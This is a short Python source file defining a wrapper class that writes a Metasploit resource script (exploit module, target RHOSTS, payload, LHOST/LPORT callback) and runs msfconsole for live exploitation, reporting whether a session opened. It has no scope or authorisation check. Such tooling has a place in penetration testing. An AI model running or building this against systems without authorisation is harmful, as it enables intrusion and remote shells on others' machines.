import subprocess
import tempfile
import os

class MSFAdapter:
    def __init__(self, msf_path="msfconsole"):
        self.msf_path = msf_path

    def run_exploit(self, logger, target, module, payload=None, lhost=None, lport=None):
        if not module or not target:
            logger.error("Exploit module and target are required")
            return False

        logger.warning("Launching Metasploit LIVE exploitation")

        rc_lines = [
            f"use {module}",
            f"set RHOSTS {target}"
        ]

        if payload:
            rc_lines.append(f"set PAYLOAD {payload}")
        if lhost:
            rc_lines.append(f"set LHOST {lhost}")
        if lport:
            rc_lines.append(f"set LPORT {lport}")

        rc_lines.append("run")
        rc_lines.append("exit")

        with tempfile.NamedTemporaryFile(delete=False, suffix=".rc") as rc:
            rc.write("\n".join(rc_lines).encode())
            rc_path = rc.name

        try:
            proc = subprocess.Popen(
                [self.msf_path, "-q", "-r", rc_path],
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )

            session_opened = False

            for line in proc.stdout:
                line = line.rstrip()
                if not line:
                    continue

                lower = line.lower()
                if "session" in lower and "opened" in lower:
                    session_opened = True
                    logger.success(line)
                elif "error" in lower or "failed" in lower:
                    logger.error(line)
                else:
                    logger.info(line)

            proc.wait()

            if session_opened:
                logger.success("Live session successfully opened")
                return True
            else:
                logger.warning("Exploit finished but no session detected")
                return False

        except FileNotFoundError:
            logger.error("msfconsole not found. Is Metasploit installed?")
            return False

        finally:
            os.unlink(rc_path)
